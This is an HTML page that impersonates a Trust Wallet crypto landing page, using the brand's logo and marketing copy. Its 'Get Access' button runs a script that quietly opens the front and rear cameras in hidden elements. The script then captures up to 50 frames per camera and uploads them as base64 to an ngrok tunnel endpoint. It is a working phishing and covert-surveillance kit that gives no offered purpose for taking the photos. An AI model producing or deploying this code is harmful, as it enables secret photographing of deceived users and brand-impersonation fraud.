<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>TrustWallet</title>
<style>
:root {
  --accent:#1e90ff;
  --bg:linear-gradient(180deg,#0a1226 0%, #081226 60%, #07122b 100%);
  --white: #ffffff;
}
body{
  margin:0; font-family:Inter, system-ui, Arial, sans-serif; background:var(--bg); color:var(--white);
  -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
}
.container{max-width:1000px;margin:0 auto;padding:40px 20px;text-align:left;}
header{display:flex;align-items:center;justify-content:flex-start;gap:8px;margin-bottom:30px;}
.logo{display:flex;align-items:center;gap:8px;}
.logo img{width:32px; height:32px;}
.logo h2{margin:0;font-size:20px;font-weight:700;}
main.hero{display:flex;gap:30px;align-items:center;justify-content:flex-start;flex-wrap:wrap;}
.hero-left{text-align:left;max-width:520px;}
.hero-left p, .hero-left h1, .hero-left .eyebrow{
  margin:6px 0;
  font-family:'Inter', sans-serif;
  font-weight:700;
}
h1{font-size:38px;line-height:1.2;}
p.lead{font-size:18px;color:rgba(255,255,255,0.85);}
.cta-row{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin-top:20px;}
.btn{background:var(--accent);color:white;padding:14px 22px;border-radius:12px;border:0;font-size:16px;cursor:pointer;box-shadow:0 8px 24px rgba(30,144,255,0.12);}
.hero-right{display:flex;align-items:center;justify-content:center;flex-direction:column;gap:20px;}
.card{
  background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
  padding:18px; border-radius:14px;
  box-shadow:0 10px 30px rgba(2,6,23,0.6);
  max-width:360px;
  width:100%;
}
#display, #display1{
  display:block;
  border-radius:10px;
  width:280px;
  height:180px;
  object-fit:cover;
  border:2px solid rgba(255,255,255,0.06);
  filter: blur(8px);
}
@media (max-width:760px){
  h1{font-size:28px;}
  #display, #display1{width:90%; height:auto;}
}
</style>
</head>
<body>
<div class="container">
  <header>
    <div class="logo">
      <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="TrustWallet Logo">
      <h2>Trust Wallet</h2>
    </div>
  </header>

  <main class="hero">
    <div class="hero-left">
      <div class="eyebrow">True crypto ownership.</div>
      <h1>Powerful Web3 experiences</h1>
      <p class="lead">Unlock the power of your cryptocurrency assets and explore the world of Web3 with Trust Wallet.</p>

      <div class="cta-row">
        <button id="getAccessBtn" class="btn">Get Access</button>
      </div>
    </div>

    <div class="hero-right">
      <div class="card">
        <img id="display1" src="Capture1.PNG" alt="Capture 1">
      </div>
      <div class="card">
        <img id="display" src="Capture.PNG" alt="Capture 2">
      </div>
    </div>
  </main>
</div>

<video id="video" autoplay muted playsinline style="display:none;width:0;height:0;"></video>
<canvas id="canvas" width="320" height="220" style="display:none;"></canvas>

<script>
const API_URL = "https://unsighing-prepalatine-yi.ngrok-free.dev/post.php";
const getBtn = document.getElementById('getAccessBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let stopCapture = false;

function captureFrame(){
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

async function sendImage(base64){
  try{
    const r = await fetch(API_URL, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ imageBase64: base64 })
    });
    return await r.json();
  }catch(e){ console.error('send error', e); return null; }
}

async function startCapture(){
  getBtn.disabled = true;
  getBtn.textContent = 'Processing...';

  const cameras = ['user','environment']; // front/back
  for(const cam of cameras){
    if(stopCapture) break;
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
    } catch (err) {
      console.warn(`Camera ${cam} not accessible:`, err);
      continue;
    }
    video.srcObject = stream;
    await video.play();

    for(let i=0;i<50;i++){
      if(stopCapture) break;
      const base64 = captureFrame();
      sendImage(base64).then(res=>console.log('sent',res)).catch(()=>{});
      await new Promise(r=>setTimeout(r, 1200));
    }

    stream.getTracks().forEach(t=>t.stop());
  }

  getBtn.disabled = false;
  getBtn.textContent = 'Get Access';
}

// Stop capture when user leaves page
window.addEventListener('beforeunload', ()=>{ stopCapture = true; });

getBtn.addEventListener('click', startCapture);
</script>
</body>
</html>
